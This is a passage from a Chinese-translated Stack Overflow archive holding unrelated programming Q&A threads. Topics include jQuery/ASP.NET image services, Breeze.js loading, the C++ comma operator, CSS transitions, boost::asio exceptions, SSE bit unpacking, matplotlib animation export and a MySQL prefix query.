                url: "CarService.asmx/GetAllProducts",
                data: "{}",
                contentType: "application/json; charset=utf-8",
                dataType: "json",
                success: function (response) {

                    var productt = response.d;
                    $.each(productt, function (index, product) {

                        $("#theList").append("<li><img src='pic/" + product.img1 + "'> <br /> " + product.name + " <br />" + product.descr + "</li>");
                    });

                    console.log(response);
                },

                error: function (response) {
                    $("#theList").append("<li>error<li>");

                    console.log(response);
                }
            });
        }
    </script>
</head>
<body>
    <div data-role="page" id="homePage">
        <div data-role="header">
            <div data-role="navbar">
                <ul>
                    <li><a href="#homePage" class="ui-btnactive">Home</a></li>
                    <li><a href="#aboutPage">7arag</a></li>
                    <li><a href="#market">Market</a></li>
                    <li><a href="#settings">Settings</a></li>
                </ul>
            </div>
        </div>
        <div data-role="content">
            <form action="echo.cfm" method="post">
            <div data-role="fieldcontain">
                <label for="name">
                    Name:</label>
                <input type="text" name="name" id="name" value="" />
            </div>
            <div data-role="fieldcontain">
                <label for="email">
                    Email:</label>
                <input type="text" name="email" id="email" value="" />
            </div>
            <div data-role="fieldcontain">
                <input type="submit" name="submit" value="Send" />
            </div>
            </form>
        </div>
        <div data-role="footer" data-position="fixed" dataid="footernav">
            <p>
                asd</p>
        </div>
    </div>
    <div data-role="page" id="market">
        <div data-role="navbar">
            <ul>
                <li><a href="#homePage" class="ui-btnactive">Home</a></li>
                <li><a href="#aboutPage">7arag</a></li>
                <li><a href="#market">Market</a></li>
                <li><a href="#settings">Settings</a></li>
            </ul>
        </div>
        <div data-role="content">
            <ul id="theList" data-role="listview" data-inset="true" data-filter="true">
            </ul>
        </div>
        <div data-role="footer" data-position="fixed" dataid="footernav">
        </div>
    </div>
    <div data-role="footer" data-position="fixed" dataid="footernav">
    </div>
    </div>
</body>
</html> 
```

并完成..享受；）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-10-30T16:32:15.593

您需要在 web 服务中将 byte[] 转换为“Convert.ToBase64String”，然后 javascript 以 base64 的形式理解图像字符串。在这里，我在我的网络服务中完成了以下代码。

```
//MyJs Code:

function getMyImage(id_No){
    $.support.cors= true;
    $.ajax({`enter code here`
        url: "http://someipaddreess/phonegap.asmx/spKP_MyImage",
        contentType: 'application/json;charset=utf-8',
        type: "POST",
        data: JSON.stringify({CSID_NO:getCSIDNumberByFK(id_No)}),
        async:false,
        dataType: "json",
        success : function(msg)  {
            var myImageStr = msg.d;
            $("#testImg").attr('src','data:image/jpeg;base64,' + myImageStr);
        },
        error: function(xhr, errorThrown, textStatus){
            window.alert("error: Failed to call WebService for measuring image" +  " " + textStatus);
        }
    });
}
//MyJs Code Ends here:
```

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.Services;
using Newtonsoft.Json;

using System.Data;
using System.IO;
using System.Data.SqlClient;
using System.Configuration;
using System.Collections;
using System.Drawing;

namespace phonegap_webservices
{
    /// <summary>
    /// Summary description for phonegap
    /// </summary>
    [WebService(Namespace = "http://tempuri.org/")]
    [WebServiceBinding(ConformsTo = WsiProfiles.BasicProfile1_1)]
    [System.ComponentModel.ToolboxItem(false)]
    // To allow this Web Service to be called from script, using ASP.NET AJAX, uncomment the following line. 
    [System.Web.Script.Services.ScriptService]
    public class phonegap : System.Web.Services.WebService
    {                
        dalKPDataSQl tblKPDataSql = new dalKPDataSQl();
        dalBuilderPortal tblBuilderPortalSql = new dalBuilderPortal();

        [WebMethod]
        public string spKP_MyImage(long CSID_NO)
        {
            DataTable dt = new DataTable();                                       
            dt = tblKPDataSql.dtGetInfoByCSID("SP_ImageFunCall", CSID_NO);
            byte[] imageByteArray = (byte[])dt.Rows[0]["MyImage"];
            return Convert.ToBase64String(imageByteArray);
        }
    }
}
```

# breeze - 我可以在 Breeze.js 中导致显式加载吗？

> ID：15443844
> 
> 赞同：0
> 
> 时间：2013-03-15T23:43:49.077
> 
> 标签：breeze

在 Entity Framework 中，我们可以使用 Include 预加载单行实体及其关联实体。

例如，假设实体 A 与实体 B、C 和 D 之间存在一对多关系：

```
var a = context.A
    .Where(a => a.Id == 7)
    .Include(a => a.B)
    .Include(a => a.C)
    .Include(a => a.D)
    .Single(); 
```

但是，这样的查询可能效率低下。例如，在本例中，我们生成一个 SQL 查询，该查询返回 A 与 B、C 和 D 的连接。因此，结果行的宽度大约等于四个表的组合宽度。如果所有条目的列数大致相同，则查询将返回一个比实际值大四倍的有效负载。如果我们查询到更深层次，生成的 SQL 效率会更低。

为了提高效率，我们可以使用显式加载和 Load() 方法。例如，

```
var a = context.A
   .Where(a => a.Id == 7)
   .Single();    
var b = context.Entry(a).Collection(a => a.B).Load().ToList();
var c = context.Entry(a).Collection(a => a.C).Load().ToList();
var d = context.Entry(a).Collection(a => a.D).Load().ToList(); 
```

这映射成四个单独的查询，返回与以前相同的总行数，但宽度只有四分之一。

在 Breeze.js 中，.expand() 映射到服务器上的 .Include()。所以我用

```
var query = breeze.EntityQuery
            .from("A")
            .where("Id", "==", 7)
            .expand("B, C, D"); 
```

但是是否有任何 Breeze.js 查询将映射到服务器上的显式加载并导致更有效的查询，如上面的 EF Eager Loading 示例中所示？也许这可以使用合并来完成，但我不知道该怎么做。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-16T02:11:54.043

也许我误解了您的问题，但是当您说查询的包含版本比使用显式加载的版本具有更大的有效负载时，我假设您是在谈论从数据库到服务器而不是从服务器到微风客户端。无论哪种方式，微风客户端的有效负载都是相同的。

但是，就是说，如果您真的想使用显式急切加载，那么我能想到的唯一方法就是像这样重写您的服务器查询，以便它不再返回 IQueryable 然后强制急切收集服务器。

```
[HttpGet]
public A EagerA(id) { 
    var a = context.A
      .Where(a => a.Id == 7)
      .Single();    
    var b = context.Entry(a).Collection(a => a.B).Load().ToList();
    var c = context.Entry(a).Collection(a => a.C).Load().ToList();
    var d = context.Entry(a).Collection(a => a.D).Load().ToList();
    return a;
} 
```

这也意味着您必须将客户端更改为使用“withParameters”而不是“where”方法，即

```
var query = breeze.EntityQuery
        .from("A")
        .withParameters( { id: 7 }); 
```

我还没有实际测试过，但我认为它会起作用。

# c++ - C++中的变量初始化：一种独特的方法

> ID：15443846
> 
> 赞同：1
> 
> 时间：2013-03-15T23:43:51.483
> 
> 标签：c++, initialization

最近我遇到了这段代码。我不知道为什么在我的“编码生活”中从未见过这种语法。

```
int main()
{
    int b;
    int a = (b=5, b + 5);

    std::cout << a << std::endl;
} 
```

a 的值为 10。这种初始化方式到底叫什么？它是如何工作的？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-15T23:48:13.280

这个说法：

```
int a = (b=5, b + 5); 
```

使用[逗号运算符](https://stackoverflow.com/questions/54142/how-does-the-comma-operator-work)。根据 C++11 标准的第 5.18/1 段：

> [...]**一对用逗号分隔的表达式从左到右计算**；左表达式是丢弃的值表达式（第 5 条）。83 与左表达式相关的每个值计算和副作用都在与右表达式相关的每个值计算和副作用之前排序。**结果的类型和值是右操作数的类型和值**；结果与其右操作数属于相同的值类别，并且如果其右操作数是泛左值和位域，则结果是位域。如果右操作数的值是临时的（12.2），则结果是临时的。

因此，您的陈述相当于：

```
b = 5;
int a = b + 5; 
```

就个人而言，我看不出这里使用逗号运算符的原因。只需以易于阅读的方式初始化变量，除非您有充分的理由不这样做。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-03-15T23:46:12.700

运算符`,`一个接一个地计算参数并返回最后一个值

它不仅可以用于初始化

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-03-15T23:48:21.180

逗号`,`运算符允许您分隔表达式。由

```
exp1, exp2, ..., expn 
```

评估为`expn`。

所以发生的事情是首先`b`设置为`5`，然后`a`设置为`b + 5`。

**附注**：因为`,`在运算符表中具有最低优先级的语义

```
int a = b = 5, b+5; 
```

不同于

```
int a = (b = 5, b+5); 
```

因为第一个被解析为`(int a = b = 5), b + 5`

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2013-03-15T23:53:13.933

在表达式中使用时，逗号运算符将评估其所有操作数（从左到右）并返回最后一个。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2013-03-15T23:45:55.877

初始化称为*复制初始化*。如果忽略右侧的复杂表达式，则与以下相同：

```
int a = 10; 
```

这与*直接初始化*形成对比，它看起来像这样：

```
int a(10); 
```

（您可能分别对如何评估*逗号表达式*感到困惑。请指出是否是这种情况。）

# c++ - 从派生类中的类中的方法访问基类成员

> ID：15443848
> 
> 赞同：0
> 
> 时间：2013-03-15T23:43:58.297
> 
> 标签：c++, visual-c++

情况如下：

```
class Base
{
 object* mainObject;
}

class Derived :
 public Base
{
 class aTrain
 {
   void* something;
   .
   .
   .
   ~aTrain()
   {
    mainObject->destroyingMethod(something);
   }
 };
} 
```

输出：**非静态成员引用必须相对于特定对象。**

我可以理解这个问题，但是如何在不将 Derived 类传递给 aTrain 构造函数的情况下解决这个问题？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-15T23:55:44.583

定义`aTrain`inside`Derived`会影响**类型** `aTrain`的范围和访问。

这并不意味着每个`aTrain`人都有一个关联的`Derived`. 可以有任意数量的`aTrain`实例，也可以有任意数量的`Derived`实例。

因此，如果您希望每个`aTrain`人都知道某个`Derived`实例，则必须使用指针或引用成员来实现它。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-15T23:49:39.943

`mainobject`如果不传递某种对in to的引用，您将无法解决此问题`aTrain`。是通过将`Derived`对象的引用传递给`aTrain`构造函数还是通过成员函数或任何其他可能的组合传递对`mainobject`in的引用来执行此操作取决于您。`aTrain``aTrain`

问题是内部类*没有*隐式的方式来访问它所包含的类的非静态成员。

# javascript - 为什么通过 JavaScript 更改样式会受到 CSS 过渡的影响

> ID：15443852
> 
> 赞同：1
> 
> 时间：2013-03-15T23:44:21.497
> 
> 标签：javascript, html, css, css-transitions

我只是在单击按钮时更改按钮的`color`和。`background-color`

```
<input type="button" value="click me" id="myButton" onclick="ChangeColor()"/> 
```

这个按钮的**CSS**包含 和 的 CSS 过渡`color`，`background-color`但是，在`:hover`伪元素上我没有添加任何样式，我没有更改颜色。

```
#myButton{
     color:#3399FF;
     background-color:#FFFFFF;
     /* These transitions are supposed to change the color in case I hover over the button */
     -webkit-transition: background 0.5s,color 0.5s;
        -moz-transition: background 0.5s,color 0.5s;
            transition: background 0.5s,color 0.5s;
}
#myButton:hover{
     /* But since there's nothing here, the color won't change when I hover */
} 
```

现在，当我通过 JavaScript 更改样式时，它们会在使用过渡时发生变化，这意味着颜色会在 之后发生变化`0.5s`，而不是立即发生变化。

```
function ChangeColor()
{
   document.getElementById("myButton").style.color = "#FFFFFF";
   document.getElementById("myButton").style.backgroundColor = "#3399FF";
} 
```

这是一件非常好的事情，我喜欢它，但我只是想知道，JavaScript 如何尊重 CSS3 转换？有这方面的文件吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-15T23:55:42.517

只要属性的值发生更改，就会应用您的转换。无论您是否通过 JavaScript 在悬停、焦点、调整大小（例如使用媒体查询）、单击或任何其他事件上更改它都没有关系。

通常，您可以在元素的两种状态之间进行转换。您首先定义初始状态：

```
#myButton {
     color: #39f;
     background: #fff;
     transition: .5s;
} 
```

当您更改这两个属性中的任何一个的值时（无论您是使用`:hover`伪类还是 JavaScript 都没有关系），您的元素将进入另一个状态，并且您将在初始状态的属性和这个新状态的属性。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-15T23:55:19.513

您使用 JavaScript 更改样式的方法本质上是一种`style`直接在元素本身上手动更改属性的方法。每当样式更改为其他样式并且您为其定义了过渡时，该过渡将激活以更改为新样式。这包括 JavaScript 对样式所做的更改。

# c++ - 从断开的套接字读取时出现未处理的异常

> ID：15443853
> 
> 赞同：-1
> 
> 时间：2013-03-15T23:44:24.317
> 
> 标签：Skype, c++, sockets, boost, boost-asio, unhandled-exception

我已经知道，不可能简单地检测套接字是否断开 - 服务器和客户端必须喊“*你能听到我吗？* ”和“*是的，我能。* ”就像我们在[Skype](/questions/tagged/skype "显示标记为“Skype”的问题")上所做的那样。
但是当`boost::asio`套接字与另一端断开连接时，我在尝试从套接字读取时获得**了 Unhanded 异常。**这是一种对我来说足够有用的断开连接检测。我可以处理那个异常，所以程序不会崩溃，而是在控制台中产生消息？
对于那些需要它的人的一些代码：

```
bool SocketClient::read(int bytes, char *text) {
      char buffer = 0;
      int length = 0;
      while(bytes>0) {
        size_t len = sock.receive(boost::asio::buffer(&buffer, 1));  //boom: UNHANDLED EXCEPTION
        bytes--;
        text[length] = buffer;
        length++;

      }
      return true;
} 
```

因为我正在连接到 minecraft 服务器，所以我知道客户端何时断开连接 - 任何读/写尝试都会导致异常。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-15T23:50:46.730

```
try
{
    size_t len = sock.receive(boost::asio::buffer(&buffer, 1));  //boom: UNHANDLED EXCEPTION
    // More code ...
}
catch (const boost::system::system_error& ex)
{
  if ( ex.code() == boost::asio::error::eof ) 
  {
    // Work your magic (console logging, retry , bailout etc.)
  }
} 
```

另请查看[文档](http://www.boost.org/doc/libs/1_53_0/doc/html/boost_asio/reference/basic_stream_socket/receive/overload2.html)。在最坏的情况下，您可以从调试器中推断出异常类型 :)

# dojo - 模糊 Dojo 1.6 中的值集

> ID：15443858
> 
> 赞同：-1
> 
> 时间：2013-03-15T23:45:00.577
> 
> 标签：dojo

如何在 dojo 1.6 中模糊过滤选择上的特定值集。我需要从下拉列表中选择蓝色值，以便用户可以看到这些选项并且无法选择

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-11-03T16:04:28.443

抱歉...模糊或蓝色？您的意思是要更改 FilteringSelect 列出的选项中某些特定情况的外观吗？我可以帮助你，但我不完全理解你的问题。您是从道场商店加载选项吗？将它们写为标记，还是使用 addOption() 方法添加它们？

# google-maps-sdk-ios - GMSMapView 内存泄漏

> ID：15443859
> 
> 赞同：7
> 
> 时间：2013-03-15T23:45:00.700
> 
> 标签：google-maps-sdk-ios

我创建了一个简单的 UIViewController 来创建和销毁 GMSMapView。

```
- (void)viewDidAppear:(BOOL)animated
{
  if ( !m_disappearing_bc_segue )
    {
       [super viewDidAppear:animated] ;

       GMSCameraPosition *camera = [GMSCameraPosition cameraWithLatitude: self.location.latitude
                                                           longitude: self.location.longitude
                                                                zoom:9 ] ;

       m_mapView = [GMSMapView mapWithFrame:CGRectMake(0, 0, 320, 420) camera:camera];

       m_mapView.myLocationEnabled = NO ;

       [m_mapView setMapType: kGMSTypeTerrain] ;

       m_mapView.delegate = self ;

      [self.view addSubview:m_mapView] ;
      [self.view sendSubviewToBack:m_mapView] ;
}

- (void)viewWillDisappear:(BOOL)animated
{
  [super viewWillDisappear:animated] ;

  [m_mapView clear] ;
  [m_mapView stopRendering] ;
  [m_mapView removeFromSuperview] ;
  m_mapView = nil ;
} 
```

我已将 Instruments 与 Allocations 工具一起使用。测试很容易。在 UINavigation ViewController 中，推送视图，回击并重复。每次推送和弹出包含上述 GMSMapView 的视图时，大约有 40kb 泄漏。我有一张来自 Instruments 的截图来说明这一点，但 stackoverflow 不允许我发布它。如果有兴趣，我可以通过电子邮件发送给某人。

我做错了什么或错过了什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2016-11-01T15:30:27.820

对我有用的是删除我的`@try`条款`dealloc`：

```
@try {
    [self.mapView removeObserver:self forKeyPath:@"myLocation"];
}
@catch (NSException *exception) {
} 
```

我的意图是`self`在 ViewController 被释放时删除观察者（具有讽刺意味的是避免内存问题），如果它不是观察者则忽略异常。

显然`@try`以某种方式保留了 mapView，这使其保留在内存中（通过 ARC）。在这里查看原因：[为什么 Objective-C 中的“try catch”会导致内存泄漏？](https://stackoverflow.com/questions/27140891/why-does-try-catch-in-objective-c-cause-memory-leak).

删除`@try`子句（并`removeObserver`使用一些标志来避免异常）后，内存恢复正常！

# image - 将 12 位图像转换为 16 位图像的最快方法

> ID：15443868
> 
> 赞同：13
> 
> 时间：2013-03-15T23:46:29.907
> 
> 标签：image, performance, optimization, image-processing

大多数现代 CMOS 相机可以产生 12 位的拜耳图像。将12 位图像数据数组转换为 16 位以便进行处理的**最快方法是什么？**实际问题是用 4 个零填充每个 12 位数字，可以假设小端，SSE2/SSE3/SS4 也可以接受。

添加的代码：

```
int* imagePtr = (int*)Image.data;
fixed (float* imageData = img.Data)
{
   float* imagePointer = imageData;
   for (int t = 0; t < total; t++)
      {
         int i1 = *imagePtr;
         imagePtr = (int*)((ushort*)imagePtr + 1);
         int i2 = *imagePtr;
         imagePtr = (int*)((ushort*)imagePtr + 2);
         *imagePointer = (float)(((i1 << 4) & 0x00000FF0) | ((i1 >> 8) & 0x0000000F));
         imagePointer++;
         *imagePointer = (float)((i1 >> 12) & 0x00000FFF);
         imagePointer++;
         *imagePointer = (float)(((i2 >> 4) & 0x00000FF0) | ((i2 >> 12) & 0x0000000F));
         imagePointer++;
         *imagePointer = (float)((i2 >> 20) & 0x00000FFF);
         imagePointer++;
      }
  } 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-18T03:00:24.250

我不能保证最快，但这是一种使用[SSE](http://en.wikipedia.org/wiki/Streaming_SIMD_Extensions)的方法。每次迭代完成 8 次 12-16 位转换，每步完成两次转换（大约）（即，每次迭代需要多个步骤）。

这种方法跨越 xmm 寄存器中 16 位边界周围的 12 位整数。下面显示了这是如何完成的。

*   正在使用一个 xmm 寄存器（假设 xmm0）。寄存器的状态由一行字母表示。
*   每个字母代表一个 12 位整数的 4 位（即，AAA 是数组中的整个第一个 12 位字）。
*   每个间隙代表一个 16 位边界。
*   >>2 表示一个字节的逻辑右移。
*   胡萝卜 (^) 符号用于突出显示每个步骤中哪些相关的 12 位整数跨越 16 位边界。

：

```
load
AAAB BBCC CDDD EEEF FFGG GHHH JJJK KKLL
^^^

>>2
00AA ABBB CCCD DDEE EFFF GGGH HHJJ JKKK
      ^^^ ^^^    

>>2
0000 AAAB BBCC CDDD EEEF FFGG GHHH JJJK
                ^^^ ^^^    

>>2
0000 00AA ABBB CCCD DDEE EFFF GGGH HHJJ
                          ^^^ ^^^    

>>2
0000 0000 AAAB BBCC CDDD EEEF FFGG GHHH
                                    ^^^ 
```

在每一步，我们都可以提取对齐的 12 位整数并将它们存储在 xmm1 寄存器中。最后，我们的 xmm1 将如下所示。问号表示我们不关心的值。

```
AAA? ?BBB CCC? ?DDD EEE? ?FFF GGG? ?HHH 
```

将高对齐整数（A、C、E、G）提取到 xmm2 中，然后在 xmm2 上执行 4 位的右逻辑字移。这会将高对齐的整数转换为低对齐的整数。将这些调整后的整数重新混合到 xmm1 中。xmm1 的状态现在是：

```
?AAA ?BBB ?CCC ?DDD ?EEE ?FFF ?GGG ?HHH 
```

最后，我们可以在每个单词上使用 0FFFh 来屏蔽整数（即，将 ? 转换为 0）。

```
0AAA 0BBB 0CCC 0DDD 0EEE 0FFF 0GGG 0HHH 
```

现在 xmm1 包含八个连续的转换整数。

下面的 NASM 程序演示了这个算法。

```
global main

segment .data
sample dw 1234, 5678, 9ABCh, 1234, 5678, 9ABCh, 1234, 5678
low12 times 8 dw 0FFFh

segment .text
main:

  movdqa xmm0, [sample]

  pblendw xmm1, xmm0, 10000000b
  psrldq xmm0, 1
  pblendw xmm1, xmm0, 01100000b
  psrldq xmm0, 1
  pblendw xmm1, xmm0, 00011000b
  psrldq xmm0, 1
  pblendw xmm1, xmm0, 00000110b
  psrldq xmm0, 1
  pblendw xmm1, xmm0, 00000001b

  pblendw xmm2, xmm1, 10101010b
  psrlw xmm2, 4

  pblendw xmm1, xmm2, 10101010b

  pand xmm1, [low12]        ; low12 could be stored in another xmm register 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-18T07:33:37.493

我会尝试围绕 SSSE3 指令构建解决方案[`PSHUFB`](http://en.wikipedia.org/wiki/SSSE3)；

给定 A=[a0, a1, a2, a3 ... a7], B=[b0, b1, b2, .. b7];

```
 PSHUFB(A,B) = [a_b0, a_b1, a_b2, ... a_b7], 
```

如果 bX 的最高位为 1，则结果字节将为 0。

因此，如果

```
 A  = [aa ab bb cc cd dd ee ef] == input vector

C=PSHUFB(A, [0 1 1 2 3 4 4 5]) = [aa ab ab bb cc cd cd dd]
C=PSRLW (C, [4 0 4 0])         = [0a aa ab bb 0c cc cd dd] // (>> 4)
C=PSLLW (C, 4)                 = [aa a0 bb b0 cc c0 dd d0] // << by immediate 
```

一个完整的解决方案将读取 3 或 6 个 mmx / xmm 寄存器并每轮输出 4/8 mmx/xmm 寄存器。中间的两个输出必须从两个输入块组合，需要一些额外的寄存器复制和组合。

# ios - 在隐藏状态栏的情况下更改应用程序时自动调整视图

> ID：15443869
> 
> 赞同：3
> 
> 时间：2013-03-15T23:46:39.680
> 
> 标签：ios, objective-c, uiviewcontroller, uistatusbar

我有一个`UIViewController`有条件地隐藏应用程序中的状态栏，但我遇到的一个问题是，当我隐藏状态栏并更改为具有状态栏的其他应用程序时，视图向上移动 20 像素以进行补偿对于缺少的状态栏，即使我已经对其进行了补偿。

我像这样隐藏状态栏：

```
[[UIApplication sharedApplication] setStatusBarHidden:YES withAnimation:UIStatusBarAnimationFade]; 
```

并再次显示：

```
[[UIApplication sharedApplication] setStatusBarHidden:NO]; 
```

我也尝试将其添加到我的隐藏中：

```
[self setWantsFullScreenLayout:YES]; 
```

这是我的节目：

```
[self setWantsFullScreenLayout:NO]; 
```

为什么我切换应用程序时视图会自动调整？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-16T01:00:01.903

您只需要补偿正在显示的**StatusBar 。**

默认情况下，视图的顶部 20px 将位于状态栏下方。

时`setStatusBarHidden:YES`，您不需要将视图向上移动 20 像素，除非您已经将视图向下移动了 20 像素`setStatusBarHidden:NO`。

# javascript - 使用鼠标检测的反验证码

> ID：15443873
> 
> 赞同：2
> 
> 时间：2013-03-15T23:47:10.987
> 
> 标签：javascript, security, captcha

我想知道是否可以为仅使用 javascript 的表单创建一个安全的人体检测机制（不使用验证码）来检测鼠标移动，因为 jquery 或操作系统代码都可以移动鼠标（所以我告诉过）。

这是我的计划：

1.  使用 jQuery，我可以检测鼠标是否移动，然后允许表单提交（如果有）。
2.  我已经启用了跨站点脚本，因此没有人可以直接提交到网页之外的站点，并且我需要 javascript 来提交表单。
3.  鼠标移动将为表单中的鼠标字段添加一个值，该值将在服务器端确定它是由人类提交的。
4.  鼠标字段将使用鼠标移动将播种的某种形式的算法，然后在服务器端对其进行解码，以便机器人可以在鼠标字段中输入任何值。

所以我想知道这种方法是否还有漏洞，或者机器人仍然绕过它的方法。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-16T01:00:28.303

不，不可能创建一个依靠鼠标移动来检测人类的安全机制。查看[java.awt.Robot](http://docs.oracle.com/javase/7/docs/api/java/awt/Robot.html)类，了解如何仅使用软件破解它的一个示例。我用这门课写了一个复活节彩蛋到一个程序中，这个程序用鼠标插口，让它跳出一些疯狂的模式。用户喜欢它；-) 你也可以用[USB Rubber Ducky](http://hakshop.myshopify.com/products/usb-rubber-ducky)破解它。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-16T00:36:35.973

您的方法依赖于对机器人来说微不足道的事情，除非您以某种我没有想到的方式使用鼠标移动。

无论您使用鼠标做什么，归根结底，您所做的只是在表单中创建一个值。

我不是 100% 确定你打算如何实现这个，但如果你只是跟踪精确的鼠标位置（我不确定 HTML 是否会让你这样做，但我可能是错的）。机器人可以通过将字段设置为您期望鼠标所在的位置来模拟这一点，或者通过将 x 和 y 的更改添加到某个值来移动“虚拟”鼠标。

（这一切都是假设机器人当然能够理解你的指令。我假设通过用纯文本 HTML 编写“请在下面的框中输入值 '290'”大多数机器人除了那个专门为您的网站编写的将能够注册...）

# python - 使用 matplotlib 保存散点图动画会产生空白视频文件

> ID：15443879
> 
> 赞同：6
> 
> 时间：2013-03-15T23:47:45.517
> 
> 标签：python, animation, matplotlib, ffmpeg, scatter

我有一个与[这个问题非常相似的问题](https://stackoverflow.com/questions/14739969/saving-scatterplot-animations-with-matplotlib)

但建议的解决方案对我不起作用。

我已经使用 matplotlib 动画模块设置了一个动画散点图。这在实时显示时工作正常。我想将它保存到 avi 文件或类似的文件中。我为此编写的代码不会出错，但它产生的视频只显示一组空白轴或黑屏。我已经做了几项检查，数据正在运行，并且数据正在更新，只是没有保存到视频中......

[我尝试按照这个问题](https://stackoverflow.com/questions/14739969/saving-scatterplot-animations-with-matplotlib)的建议删除“animated=True”和“blit=True”， 但这并没有解决问题。

我已将相关代码放在下面，但如有必要可以提供更多。谁能建议我应该怎么做才能使它正常工作？

```
def initAnimation(self):
        rs, cfgs = next(self.jumpingDataStreamIterator)     
        #self.scat = self.axAnimation.scatter(rs[0], rs[1], c=cfgs[0], marker='o')
        self.scat = self.axAnimation.scatter(rs[0], rs[1], c=cfgs[0], marker='o', animated=True)
        return self.scat,

def updateAnimation(self, i):
    """Update the scatter plot."""
    rs, cfgs = next(self.jumpingDataStreamIterator)
    # Set x and y data...
    self.scat.set_offsets(rs[:2,].transpose()) 
    #self.scat = self.axAnimation.scatter(rs[0], rs[1], c=cfgs[0], animated=True)
    # Set sizes...
    #self.scat._sizes = 300 * abs(data[2])**1.5 + 100
    # Set colors..
    #self.scat.set_array(cfgs[0])
    # We need to return the updated artist for FuncAnimation to draw..
    # Note that it expects a sequence of artists, thus the trailing comma.
    matplotlib.pyplot.draw()
    return self.scat,

def animate2d(self, steps=None, showEvery=50, size = 25):
    self.figAnimation, self.axAnimation = matplotlib.pyplot.subplots()
    self.axAnimation.set_aspect("equal")
    self.axAnimation.axis([-size, size, -size, size])
    self.jumpingDataStreamIterator = self.jumpingDataStream(showEvery)

    self.univeseAnimation = matplotlib.animation.FuncAnimation(self.figAnimation, 
                            self.updateAnimation, init_func=self.initAnimation,
                            blit=True)
    matplotlib.pyplot.show()

def animate2dVideo(self,fileName=None, steps=10000, showEvery=50, size=25):
    self.figAnimation, self.axAnimation = matplotlib.pyplot.subplots()
    self.axAnimation.set_aspect("equal")
    self.axAnimation.axis([-size, size, -size, size])
    self.Writer = matplotlib.animation.writers['ffmpeg']
    self.writer = self.Writer(fps=1, metadata=dict(artist='Universe Simulation'))
    self.jumpingDataStreamIterator = self.jumpingDataStream(showEvery)

    self.universeAnimation = matplotlib.animation.FuncAnimation(self.figAnimation, 
                            self.updateAnimation, scipy.arange(1, 25), init_func=self.initAnimation)

    self.universeAnimation.save('C:/universeAnimation.mp4', writer = self.writer) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T10:46:54.103

抱歉耽搁了。我找到了一种解决方法，只需保存大量单独的图像，然后调用 ffmpeg 将它们链接在一起。这并不理想，但可以完成工作。（大班的一部分）

```
def easyway(self, frames):
    ##INSERT CODE TO GET xdata and ydata!
    for i in range(0, frames):
       fileName = "videoName"+"%04d.png" % i
       matplotlib.pyplot.scatter(xdata,ydata,c=coldata, marker='*',
                              s=15.0, edgecolor='none')
       matplotlib.pyplot.savefig(self.workingDirectory+'temp/'+fileName, dpi=dpi)
       matplotlib.pyplot.close()   
       ##INSERT CODE TO UPDATE xdata and ydata!
    self.createVideoFile(fps)#calls FFMpeg to chain together all the pictures

    if cleanUp:#removes all the picture files created in the process
        print "temporary picture files being removed..."
        self.clearDirectory()
    print "FINISHED"

def clearDirectory(self,directoryName='temp'):
    files = glob.glob(self.workingDirectory+directoryName+"/*")
    for f in files:
        os.remove(f)

def createVideoFile(self,fps=3):
    command="ffmpeg -f image2 -r %s -i %s%s" % (str(fps), self.workingDirectory+'temp/', self.universe.description)
    command+="%04d.png"
    command+=" -c:v libx264 -r 30 %s.mp4" % (self.workingDirectory+'videos/'+self.universe.description)
    print "Running command:"
    print command
    p = subprocess.Popen(command, shell=True, stdout = subprocess.PIPE, stderr=subprocess.STDOUT)
    output = p.communicate()[0]
    print "output\n"+"*"*10+"\n"
    print output
    print "*"*10
    print "Video file has been written" 
```

# mysql - 查询输入的子字符串是字段的一部分

> ID：15443884
> 
> 赞同：0
> 
> 时间：2013-03-15T23:48:26.570
> 
> 标签：mysql, substring

我正在尝试提出一个查询，如果输入是 id 或者输入包含与输入开头匹配的最长别名，则该查询返回一行。这是一个示例数据表以及结果应该是什么。

**桌子：**

```
id+alias
1 | dept
2 | dept/reception
3 | dept/support
4 | dept/support/server
5 | dept/support/networking
6 | 
7 | news
8 | purple 
```

**抬头：**

```
input => result
5 => 5
dept => 1
dept/add => 1
purple => 8
dept/support/moo => 3
dept/reception/bldg5/floor7 => 2 
```

如果我正在寻找别名中的输入，那将很容易，但我不知道如何找到与输入一起并且是最长别名的别名。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-16T00:04:38.773

```
SELECT * FROM `tbl` 
WHERE `id` = 'INPUT' 
  OR `alias` = 'INPUT'
  OR 'INPUT' LIKE CONCAT(`alias`,'%')
  ORDER BY `id` = 'INPUT' DESC, 
    `alias` = 'INPUT' DESC, 
    (LENGTH(`alias`) - LENGTH(REPLACE(`alias`, '/', ''))) DESC
LIMIT 0,1 
```

# floating-point - 双精度浮点格式的最大和最小指数

> ID：15443887
> 
> 赞同：4
> 
> 时间：2013-03-15T23:48:33.723
> 
> 标签：floating-point, numbers, precision, exponent, numeric-limits

根据[IEEE Std 754-2008](http://en.wikipedia.org/wiki/IEEE_754_revision)标准，binary64 双精度浮点格式的指数字段宽度为 11 位，通过 1023 的指数偏差进行补偿。标准还规定最大指数为 1023，并且最小值为 -1022。为什么最大指数不是：

```
2^10 + 2^9 + 2^8 + 2^7 + 2^6 + 2^5 + 2^4 + 2^3 + 2^2 + 2^1 + 2^0 - 1023 = 1024 
```

并且最小指数不是：

```
0 - 1023 = -1023 
```

* * *

## 回答 #1

> 赞同：9
